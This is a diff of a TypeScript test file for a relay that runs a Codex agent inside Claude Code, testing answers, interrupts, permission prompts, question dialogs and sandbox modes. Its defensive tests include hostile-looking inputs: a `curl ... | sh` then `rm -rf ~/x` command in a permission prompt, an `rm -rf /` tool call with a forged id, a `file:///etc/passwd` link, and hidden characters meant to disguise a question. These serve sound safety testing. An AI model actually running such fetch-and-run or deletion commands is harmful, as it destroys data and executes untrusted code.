@@ -5,7 +5,6 @@ import { codexMode } from '../../hooks/adapters/codex'
 import { agentInfo, agentStore, ROOT, run, runTurn, STEP } from '../helpers'
 
 type TestOn = Parameters<TestBody>[1]
-// A dialog's questions, as Claude Code's AskUserQuestion takes them.
 type Dialog = { question: string; header: string; multiSelect: boolean; options: { label: string; description: string }[] }[]
 type Spawn = { argv: string[]; input: string | undefined; env?: Record<string, string> }
 type Write = { path: string; text: string }
@@ -15,8 +14,6 @@ const chunk = (messageId: string, text: string) => ({
   sessionId: SID,
   update: { content: { text, type: 'text' }, messageId, sessionUpdate: 'agent_message_chunk' },
 })
-// Captured from relay/relay.mjs over @agentclientprotocol/codex-acp 2.2.2 (codex-cli 0.163.0,
-// 2026-10-24): a sentence, a `sleep 33` an interrupt cancelled, then the interrupt's answer.
 const CAPTURED = [
   { relay: 'session', sessionId: SID },
   { relay: 'model', name: 'gpt-6.1-sol' },
@@ -95,18 +92,15 @@ function arrange(
     codexAt?: string[]
     projectCodex?: boolean
     homeCodex?: boolean
-    nodes?: string[][] // every node command via ran
-    acp?: string[] // the folders ~/.claude/via/acp holds
-    // Stands in for the step server on a call that reaches it: what it was called with, and its result, which a
-    // tool.call hook reads as the MCP tool's content blocks (as Claude Code 2.1.325 gives it).
+    nodes?: string[][]
+    acp?: string[]
     step?: { called: Record<string, unknown>[]; result: () => unknown }
-    unheld?: boolean // the stream goes on past a question without waiting for its answer
-    env?: Record<string, string> // more of the person's environment, beside HOME
-    description?: string // the Agent description the spawn left in the agent's record
-    // Stands in for the person at Claude Code's AskUserQuestion dialog: each dialog's questions, and the result.
+    unheld?: boolean
+    env?: Record<string, string>
+    description?: string
     dialog?: { shown: Dialog[]; answer: (questions: Dialog) => object | Promise<object> }
-    timeout?: string // the person's askUserQuestionTimeout setting
-    agents?: Promise<void> // Claude Code's agent list answers once this settles
+    timeout?: string
+    agents?: Promise<void>
   } = {},
 ) {
   const clock = mock.clock(on)
@@ -145,8 +139,6 @@ function arrange(
     o.listed?.push([...e.argv])
     return ran(o.mcp?.stdout ?? '[]', o.mcp?.exitCode ?? 0)
   })
-  // The pinned codex-acp is installed unless a test says otherwise; no folder holds a .codex unless
-  // a test names one.
   on('fs.stat', (_, e) => {
     if (e.path === ENTRY) {
       if (o.uninstalled) throw new Error('ENOENT')
@@ -166,7 +158,7 @@ function arrange(
             name,
             kind: 'dir' as const,
             size: 0,
-            mtimeMs: (o.acp ?? []).indexOf(name), // installed in list order, oldest first
+            mtimeMs: (o.acp ?? []).indexOf(name),
             isLink: false,
           }))
         : [{ name: 'config.toml', kind: 'file' as const, size: 1, mtimeMs: 0, isLink: false }],
@@ -201,7 +193,6 @@ function arrange(
         await o.pause.second.until
       }
     }
-    // Like the relay, a stream with a question waits for its answer before going on.
     const [before, after] = o.unheld ? [out.stdout ?? ''] : (out.stdout ?? '').split(/(?<="relay":"(?:ask|question)"[^\n]*\n)/)
     if (before) yield { stream: 'stdout' as const, text: before }
     if (after !== undefined) {
@@ -245,13 +236,11 @@ test('only the last message is the answer, signed with the model the session run
     cache_read_input_tokens: 0,
     cache_creation_input_tokens: 0,
   })
-  // codex's command is a call to via's tool, not text in the answer.
   expect(chunks.some((c) => c.kind === 'input' && JSON.parse(c.json).title === 'sleep 33')).toBe(true)
   expect(chunks.some((c) => c.kind === 'text' && c.text.includes('sleep 33'))).toBe(false)
   expect(chunks.some((c) => c.kind === 'text' && c.text.includes('▸ interrupted'))).toBe(true)
 })
 
-// codex-acp 2.6.0 sends its warnings as notices once the client takes them (src/SessionNotice.ts).
 const NOTICE = {
   sessionId: SID,
   update: {
@@ -286,7 +275,6 @@ test('a notice survives a failed run, said before why it failed', async ($, on) 
   expect(result.answer).toContain('overloaded')
 })
 
-// No model refuses on demand: the captured run's last prompt is given each stop reason in turn.
 const stoppedWith = (stopReason: string) => CAPTURED.map((e, i) => (i >= CAPTURED.length - 2 ? { ...e, stopReason } : e))
 
 const STOPPED: Record<string, string> = {
@@ -306,7 +294,6 @@ for (const [stopReason, said] of Object.entries(STOPPED))
 
 test('a refused prompt that a later prompt answers is signed: the last prompt is the answer', async ($, on) => {
   arrange(on, [], {
-    // The interrupted prompt's stop reason, refused in its place.
     stdout: lines(CAPTURED.map((e, i) => (i === 8 ? { ...e, stopReason: 'refusal' } : e))),
   })
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
@@ -317,7 +304,6 @@ test('a refused prompt that a later prompt answers is signed: the last prompt is
 test('an interrupt the relay already ran is neither rerun nor named as undelivered', async ($, on) => {
   const spawns: Spawn[] = []
   const writes: Write[] = []
-  // The stream pauses mid-turn until the interrupt reaches the inbox, as a real one would.
   const before = lines(CAPTURED.slice(0, 8))
   const after = lines(CAPTURED.slice(8))
   let sent!: () => void
@@ -343,14 +329,11 @@ test('an interrupt the relay already ran is neither rerun nor named as undeliver
   expect(spawns).toHaveLength(1)
   expect(result.answer).toBe('REDIRECTED\n\n— answered by codex, gpt-6.1-sol')
   expect(result.answer).not.toContain('Not delivered')
-  // The command the interrupt cut off is closed when the relay reports the interrupt, not left running.
   expect(calls).toEqual([{ result: 'interrupted', isError: true }])
 })
 
 test('what the session says while it reopens after an interrupt is not part of the answer', async ($, on) => {
   const spawns: Spawn[] = []
-  // The relay closes the session to stop the interrupted step's commands, then resumes it: codex can speak
-  // in between, as it does when the resumed thread's recorded model differs from its default.
   const at = CAPTURED.findIndex((e) => 'relay' in e && e.relay === 'interrupted') + 1
   const reopened = [...CAPTURED.slice(0, at), chunk('msg_w', 'Warning: resuming with another model.\n'), ...CAPTURED.slice(at)]
   arrange(on, spawns, { stdout: lines(reopened) })
@@ -393,7 +376,6 @@ test("a plan-mode spawn's first step runs read-only, from the mode the spawn car
 
 test('the session id is saved, and a follow-up resumes it without replaying its history into the answer', async ($, on) => {
   const spawns: Spawn[] = []
-  // On session/load the agent replays its history before the relay's first prompt.
   const replayed = [{ relay: 'session', sessionId: SID }, chunk('msg_old', 'OLD ANSWER'), ...CAPTURED.slice(1)]
   const { records } = arrange(on, spawns, { stdout: lines(replayed) })
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
@@ -406,8 +388,6 @@ test('the session id is saved, and a follow-up resumes it without replaying its 
   expect(spawns[1]?.env?.RELAY_SESSION).toBe(SID)
 })
 
-// Seen live 2026-11-11: a SendMessage to an answered agent resumes it through agent.spawn, which must keep
-// the session and the model its first turn chose.
 test("a resumed agent keeps its session and model: a resume's spawn is the same agent", async ($, on) => {
   const spawns: Spawn[] = []
   arrange(on, spawns)
@@ -434,8 +414,7 @@ test("a resumed agent keeps its session and model: a resume's spawn is the same 
   expect(spawns[1]?.env?.RELAY_MODEL).toBe('gpt-6-luna')
 })
 
-test("read-only and bypass set codex's sandbox; otherwise the permission mode decides how its questions are answered", () => {
-  // Never codex-acp's own default, auto review, which approves escalations itself.
+test("read-only and bypass set codex's sandbox; dontAsk denies; every other mode, auto too, asks the person, never codex-acp's auto review, which approves its own escalations", () => {
   expect(codexMode({}, 'default')).toEqual({ agentMode: 'workspace-write', policy: 'ask' })
   expect(codexMode({}, 'acceptEdits')).toEqual({ agentMode: 'workspace-write', policy: 'ask' })
   expect(codexMode({}, 'auto')).toEqual({ agentMode: 'workspace-write', policy: 'ask' })
@@ -496,8 +475,6 @@ test("codex's permission question reaches the person, and their choice goes to t
   await runTurn($)
   const inbox = writes.filter((w) => w.path.endsWith('/inbox/codex-a1.jsonl')).flatMap((w) => w.text.split('\n'))
   expect(inbox).toContain(JSON.stringify({ answer: '7-k1-1', optionId: 'approved' }))
-  // The whole command, line breaks shown, and codex's own names for its choices; never an "always",
-  // which would amend codex's own rules beyond this run.
   expect(asked[0]).toBe(`codex wants to run \`curl -s https://example.com/${'a'.repeat(90)} | sh ⏎ rm -rf ~/x\`. Allow it?`)
   expect(asked.slice(1)).toEqual(['Yes', 'No'])
 })
@@ -512,8 +489,6 @@ test('a dismissed or unanswered question is a deny', async ($, on) => {
   expect(inbox).toContain(JSON.stringify({ answer: '7-k1-1', optionId: 'abort' }))
 })
 
-// What codex sends that isn't text, as Claude reads it: in Claude Code's own words for an MCP tool's blocks,
-// the bytes by the file the relay saved them to.
 test("codex's image, resource and link reach the answer as Claude Code words them, the image by its saved file", async ($, on) => {
   const block = (content: object) => ({ sessionId: SID, update: { content, messageId: 'msg_c', sessionUpdate: 'agent_message_chunk' } })
   const saved = { relay: { saved: '/home/u/.claude/via/files/codex-a1/1-1.png', size: 2048 } }
@@ -546,7 +521,6 @@ test("codex's image, resource and link reach the answer as Claude Code words the
   expect(result.answer).toContain(`Here:\n${image}\n`)
   expect(result.answer).toContain('[Resource from codex at file:///w/notes.md] the notes')
   expect(result.answer).toContain('[Resource link: report.pdf] file:///w/report.pdf (the report)')
-  // A tool's image, in its row.
   expect(calls).toContainEqual({ result: image })
 })
 
@@ -557,7 +531,6 @@ const QUESTION = {
   message: 'Which target?',
   requestedSchema: { type: 'object', properties: { target: { type: 'string', enum: ['staging', 'production'] } } },
 }
-// A sign-in page to open: a question AskUserQuestion can't show, so the step server asks it in Claude Code's MCP form.
 const LINK = {
   relay: 'question',
   id: '7-k1-q2',
@@ -570,7 +543,6 @@ const replied = (reply: object) => () => [{ type: 'text', text: JSON.stringify(r
 const inboxOf = (writes: Write[]) => writes.filter((w) => w.path.endsWith('/inbox/codex-a1.jsonl')).flatMap((w) => w.text.split('\n'))
 const picked = (label: string) => (questions: Dialog) => ({ answers: { [questions[0]?.question ?? '']: label } })
 const never = () => new Promise<object>(() => {})
-// The agent as Claude Code spawns it: in the background, unless a test says otherwise; headless, in a -p run.
 async function spawn($: Parameters<TestBody>[0], on: TestOn, background = true, headless = false) {
   on('agent.spawn', (_, e) => ({ model: e.model ?? '', agentId: 'a1' }))
   on('session.start', (_, e) => ({ cwd: e.cwd }))
@@ -587,7 +559,6 @@ async function spawn($: Parameters<TestBody>[0], on: TestOn, background = true, 
   }
   await $.agent.spawn(input)
 }
-// Runs the turn on past via's own SendMessage call, as the engine would, once that call is answered.
 async function runOn($: Parameters<TestBody>[0], from: number) {
   return runTurn($, { ...STEP, index: from })
 }
@@ -599,8 +570,6 @@ const sent = (chunks: TurnStepChunk[]) =>
       : []
   })
 
-// codex-acp puts each of Codex's questions in a field's title, its choices as oneOf, and a note field beside it
-// (seen live, 2026-11-22).
 const long = (n: number) => `The full E2E run found a scope conflict number ${n}: should the fix include the header change?`
 const CODEX_FORM = {
   relay: 'question',
@@ -631,7 +600,6 @@ test("codex's question is asked whole in Claude Code's AskUserQuestion dialog, a
   await spawn($, on)
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const { calls } = await runTurn($)
-  // The title whole, past the form's 47 characters; the note field is where typed text goes, not a question.
   expect(dialog.shown).toEqual([
     [
       {
@@ -648,7 +616,6 @@ test("codex's question is asked whole in Claude Code's AskUserQuestion dialog, a
   ])
   expect(step.called).toHaveLength(0)
   expect(inboxOf(writes)).toContain(JSON.stringify({ question: '7-k1-q1', answer: { action: 'accept', content: { question_0: 'No' } } }))
-  // The row says what the person answered.
   expect(calls).toContainEqual({ result: 'Answered: {"question_0":"No"}' })
 })
 
@@ -683,7 +650,6 @@ test('a number outside its range is asked again with why', async ($, on) => {
     'Which target?\n\nHow many workers? (a whole number from 1 to 8)',
     '"Which target?\n\nHow many workers? (a whole number from 1 to 8)" needs a whole number from 1 to 8, not "9".\n\nWhich target?\n\nHow many workers? (a whole number from 1 to 8)',
   ])
-  // The number is typed under "Other"; Decline makes the dialog's second option.
   expect(dialog.shown[0]?.[0]?.options.map((o) => o.label)).toEqual(['Let Claude answer', 'Decline'])
   expect(inboxOf(writes)).toContain(JSON.stringify({ question: '7-k1-q1', answer: { action: 'accept', content: { workers: 4 } } }))
 })
@@ -703,15 +669,12 @@ test('a question the step server leaves unanswered goes back to codex as a cance
 
 test('a question codex closes before the person answers ends the wait, and nothing goes to the inbox', async ($, on) => {
   const writes: Write[] = []
-  // The person never answers: the turn ends only if the closed line ends the wait, and with no answer nothing
-  // can reach the inbox.
   const dialog = { shown: [] as Dialog[], answer: never }
   const closed = { relay: 'question_closed', id: QUESTION.id }
   arrange(on, [], { stdout: lines([...CAPTURED.slice(0, 3), QUESTION, closed, ...CAPTURED.slice(10)]) }, { writes, dialog, unheld: true })
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const { calls, result } = await runTurn($)
   expect(calls).toContainEqual({ result: 'No longer needed: the harness moved on before you answered.' })
-  // The run read on: codex's answer after the question is the agent's.
   expect(result.answer).toContain('REDIRECTED')
   expect(inboxOf(writes).some((line) => line.includes('"question"'))).toBe(false)
 })
@@ -725,11 +688,9 @@ test("a question's shown text loses the characters that hide or reorder it; its 
       type: 'object',
       properties: {
         target: { type: 'string', title: `Tar${hidden}get`, enum: [`a${hidden}`, 'b'], enumNames: [`A${hidden}`, 'B'] },
-        // Shown by their values: given cleaned names, the values kept.
         size: { type: 'string', enum: [`s${hidden}`, 'm'], default: `m${hidden}` },
         speed: { type: 'string', oneOf: [{ const: `f${hidden}` }, { const: 'slow', title: 'Slow' }] },
         [`no${hidden}te`]: { type: 'string' },
-        // A fifth field: more than AskUserQuestion's four, so the form asks it.
         when: { type: 'string' },
       },
     },
@@ -743,7 +704,6 @@ test("a question's shown text loses the characters that hide or reorder it; its 
     elicitationId: 'e1',
   }
   const step = { called: [] as Record<string, unknown>[], result: replied({ action: 'decline' }) }
-  // A link to a file never becomes a question, whatever line carries it.
   const file = { ...link, id: '7-k1-q3', url: 'file:///etc/passwd' }
   arrange(on, [], { stdout: lines([...CAPTURED.slice(0, 3), sneaky, link, file, ...CAPTURED.slice(10)]) }, { step })
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
@@ -773,11 +733,6 @@ test("a question's shown text loses the characters that hide or reorder it; its 
   expect(step.called).toHaveLength(2)
 })
 
-// Claude Code's MCP form cuts a field's title at about 47 characters, and codex-acp puts each of Codex's questions
-// in its field's title (seen live, 2026-11-22). The message shows 3 lines, each cropped at the terminal's width: a
-// long question goes first in it, wrapped to 72 columns, and its field gets a short label. A later one moves only
-// while every moved question still fits in those 3 lines; otherwise it keeps its own title. A short title stays put.
-// Only for a form AskUserQuestion can't show: here, a choice of five.
 const FIVE = ['A', 'B', 'C', 'D', 'E'].map((c) => ({ const: c, title: c }))
 const field = (title: string) => ({ type: 'string', title, oneOf: FIVE })
 const note = { type: 'string', title: 'Additional answer or note' }
@@ -795,7 +750,6 @@ const titled = (id: string, titles: string[]) => ({
     ),
   },
 })
-// The questions as the step server receives them.
 async function shown($: Parameters<TestBody>[0], on: TestOn, forms: object[]) {
   const step = { called: [] as Record<string, unknown>[], result: replied({ action: 'decline' }) }
   arrange(on, [], { stdout: lines([...CAPTURED.slice(0, 3), ...forms, ...CAPTURED.slice(10)]) }, { step })
@@ -805,11 +759,7 @@ async function shown($: Parameters<TestBody>[0], on: TestOn, forms: object[]) {
 }
 
 test("a question too long for its field's title is shown whole in the form's message", async ($, on) => {
-  const [one, two] = await shown($, on, [
-    titled('7-k1-q1', [long(1)]),
-    // Two lines each: the second would not fit in the 3 shown, so it keeps its own title.
-    titled('7-k1-q2', [long(1), 'Which target?', long(2)]),
-  ])
+  const [one, two] = await shown($, on, [titled('7-k1-q1', [long(1)]), titled('7-k1-q2', [long(1), 'Which target?', long(2)])])
   const message = [
     'The full E2E run found a scope conflict number 1: should the fix include',
     'the header change?',
@@ -828,7 +778,6 @@ test('long questions that fit in the shown lines are numbered in the message; a 
   const fortyOne = `${forty}?`
   const [form, three] = await shown($, on, [
     titled('7-k1-q1', [fortyOne, forty, `${fortyOne} Again`]),
-    // Two lines and one: exactly the 3 shown, so both move.
     titled('7-k1-q2', [long(1), fortyOne]),
   ])
   expect(form).toMatchObject({
@@ -867,7 +816,6 @@ test('"Let Claude answer" hands the question to the main agent, whose message na
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const first = await runTurn($)
   expect(first.calls).toContainEqual({ result: 'Handed to the main agent: the person chose "Let Claude answer".' })
-  // The step after the question is this agent's SendMessage to the main agent.
   expect(sent(first.chunks)).toEqual([
     {
       id: expect.stringMatching(/^toolu_via_send_/),
@@ -970,18 +918,15 @@ test('a question handed while another waits on the main agent goes after it, so 
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const first = await runTurn($)
   expect(sent(first.chunks).map((s) => s.message)).toEqual([handoff('no one can be asked in this session')])
-  // Codex asks again before the main agent answers: the later question waits, its message not yet sent.
   const rest = runOn($, first.result.index + 1)
   await clock.settle()
   const answer = await $.tool.call({ tool: 'SendMessage', to: 'a1', message: 'No', tool_use_id: 'm1' })
   expect(answer.result).toEqual({ success: true, message: 'Answered: {"question_0":"No"} for codex, which goes on.' })
   expect(inboxOf(writes)).toContain(JSON.stringify({ question: '7-k1-q1', answer: { action: 'accept', content: { question_0: 'No' } } }))
   expect(inboxOf(writes).some((line) => line.includes('7-k1-q2'))).toBe(false)
-  // The later question has not been sent: the main agent's next message is a steer, not its answer.
   const more = await $.tool.call({ tool: 'SendMessage', to: 'a1', message: 'Yes, and keep going', tool_use_id: 'm0' })
   expect(more.result).toEqual({ success: true, message: 'Delivered to the running codex agent; codex reads it at its next step.' })
   expect(inboxOf(writes).some((line) => line.includes('7-k1-q2'))).toBe(false)
-  // With the first answered, the later question goes to the main agent as the run's next step.
   await clock.advance(10_000)
   const second = await rest
   expect(second.calls).toContainEqual({
@@ -1012,13 +957,11 @@ test('a hand-off whose run ended while it was being made is never sent, and noth
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const turn = runTurn($)
   await clock.settle()
-  // The person chose "Let Claude answer"; the turn ends while via looks up the agent's name.
   await $.turn.complete({ turnId: 't1', agentId: 'a1', answer: '', durationMs: 0, isAborted: true, reason: 'aborted' })
   list()
   const { calls, chunks } = await turn
   expect(calls).toContainEqual({ result: 'Not answered' })
   expect(sent(chunks)).toEqual([])
-  // The run's end closed its inbox: no answer is written to it.
   expect(noQuestionAnswered(writes)).toBe(true)
 })
 
@@ -1067,7 +1010,6 @@ test("once codex withdraws a handed question, the main agent's late message is a
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'go' })
   const handed = await runTurn($)
   expect(sent(handed.chunks)).toHaveLength(1)
-  // The next step reads codex's withdrawal, then waits on codex.
   const rest = runOn($, handed.result.index + 1)
   withdraw.open()
   await clock.settle()
@@ -1079,8 +1021,6 @@ test("once codex withdraws a handed question, the main agent's late message is a
   await rest
 })
 
-// The question call is the one step call that reaches Claude Code's permission check: auto mode's classifier
-// gave it no verdict live (2026-11-16), so via settles the mode's ask on its own question call, and only that.
 test("via settles only the mode's ask on its own question call: a deny, a rule's ask, or another call's still stands", async ($, on) => {
   const step = { called: [] as Record<string, unknown>[], result: replied({ action: 'decline' }) }
   arrange(on, [], { stdout: lines([...CAPTURED.slice(0, 3), QUESTION, ...CAPTURED.slice(10)]) }, { step })
@@ -1094,7 +1034,6 @@ test("via settles only the mode's ask on its own question call: a deny, a rule's
   const check = (tool_use_id: string, called: object = input) =>
     $.tool.check({ tool: 'mcp__plugin_via_step__step', input: called, tool_use_id, agentId: 'a1' } as never)
   expect((await check(id)).decision).toBe('allow')
-  // A model's call, or via's call for a harness tool call, which never reaches the check's decider.
   expect((await check('toolu_forged')).decision).toBe('ask')
   expect((await check(id, { kind: 'execute', title: 'rm -rf /' })).decision).toBe('ask')
   verdict = { decision: 'deny' }
@@ -1118,7 +1057,6 @@ test("a question call via didn't make is refused, never let through to the step 
   expect(step.called).toHaveLength(0)
 })
 
-// Which levels a model has is codex's to say: the relay checks the line against what the session offers.
 test('a thinking line becomes the reasoning_effort config option, whatever its level', async ($, on) => {
   const spawns: Spawn[] = []
   arrange(on, spawns)
@@ -1136,7 +1074,6 @@ test("a config line goes to the relay as the person's option, and holds for foll
   await $.turn.start({ turnId: 't2', agentId: 'a1', text: 'config: fast-mode=off\nand again' })
   await runTurn($, { ...STEP, turnId: 't2', messageCount: 2 })
   expect(JSON.parse(spawns[1]?.env?.RELAY_OPTIONS ?? '{}')).toEqual({ 'fast-mode': 'off', speed: 'fast' })
-  // An empty value drops the option; none left sends none.
   await $.turn.start({ turnId: 't3', agentId: 'a1', text: 'config: fast-mode=\nconfig: speed=\nonce more' })
   await runTurn($, { ...STEP, turnId: 't3', messageCount: 3 })
   expect(spawns[2]?.env?.RELAY_OPTIONS).toBeUndefined()
@@ -1149,7 +1086,6 @@ test('a read-only run takes no config line, whatever the option, with no spawn',
   const { result } = await runTurn($)
   expect(spawns).toHaveLength(0)
   expect(result.answer).toContain('A read-only codex run takes no config lines')
-  // Refused before the record kept it: the next message runs.
   await $.turn.start({ turnId: 't2', agentId: 'a1', text: 'tools: read\ngo' })
   await runTurn($, { ...STEP, turnId: 't2', messageCount: 2 })
   expect(spawns).toHaveLength(1)
@@ -1252,7 +1188,6 @@ test('a fresh install keeps the release before it and removes older codex-acp ve
   await runTurn($)
   await clock.settle()
   const removed = nodes.find((argv) => argv[1] === '-e')
-  // 2.5.0, the release before, stays for a session still running it.
   expect(removed?.slice(3).sort()).toEqual(['/home/u/.claude/via/acp/codex-acp-2.3.0', '/home/u/.claude/via/acp/codex-acp-2.3.1-preview.9'])
 })
 
@@ -1294,7 +1229,6 @@ test("read-only is refused under a project's .codex folder, whose config codex-a
 
 test("the person's own ~/.codex does not void read-only", async ($, on) => {
   const spawns: Spawn[] = []
-  // A session inside the home folder: walking up reaches ~/.codex, which resolves to the person's own.
   arrange(on, spawns, undefined, { codexAt: ['/home/u/.codex'], homeCodex: true })
   await $.turn.start({ turnId: 't1', agentId: 'a1', text: 'tools: read\nlook' })
   await runTurn($)
@@ -1330,12 +1264,6 @@ test('a /compact turn shows the compaction as a row and answers that it compacte
   expect(result.answer).toBe('Compacted the conversation.\n\n— answered by codex, gpt-6-luna')
 })
 
-// Claude Code gives a hook ten seconds of its own time (HookBudget). A wait on its own $ call is not its own time;
-// a wait on a read another hook started appears to be (inferred, not documented): after a Codex question, the step call that followed waited on the
-// read the question's hook left pending, and was refused at 10 s (2026-11-23, a lint then a typecheck). So a step
-// call waits on a silent harness only through the engine's bounded wait ($.viaSteps.wait, 5 s), whoever started the read.
-// Says each timed wait via asks for, from beside it: the test's own on already answers clock.after (mock.clock),
-// and an inline plugin shares nothing with the test file, so it says each one as a write the test records.
 const COUNTER = {
   name: 'wait-counter',
   register(on: TestOn) {
@@ -1386,7 +1314,6 @@ test(
       })
     await clock.settle()
     const before = waitsSoFar()
-    // Thirty seconds of silence: three times the hook's budget.
     for (let s = 0; s < 6; s += 1) await clock.advance(5_000)
     expect(answered).toBe(false)
     expect(waitsSoFar() - before).toBeGreaterThanOrEqual(6)
